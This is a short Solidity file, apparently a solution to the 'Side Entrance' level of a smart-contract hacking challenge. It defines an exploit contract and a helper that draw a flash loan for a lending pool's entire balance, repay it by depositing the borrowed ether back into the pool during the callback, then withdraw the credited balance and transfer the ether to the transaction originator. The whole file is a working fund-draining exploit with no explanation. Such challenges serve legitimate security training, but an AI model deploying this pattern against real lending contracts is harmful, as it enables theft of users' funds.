// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploit {
    SideEntranceExploitHelper helper;

    constructor(address _pool) {
        helper = new SideEntranceExploitHelper(_pool);
        helper.go();
    }

    receive() external payable {}
}

contract SideEntranceExploitHelper is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function go() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(tx.origin).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
